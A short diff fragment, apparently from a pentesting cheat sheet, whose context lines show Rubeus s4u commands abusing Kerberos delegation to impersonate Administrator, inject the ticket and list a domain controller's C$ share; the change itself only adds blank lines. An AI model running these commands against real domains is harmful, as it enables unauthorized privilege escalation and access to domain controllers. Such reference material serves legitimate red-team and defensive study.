@@ -20,3 +20,5 @@ Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:use
 Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
 dir \\dc.domain.com\c$
 ```
+
+
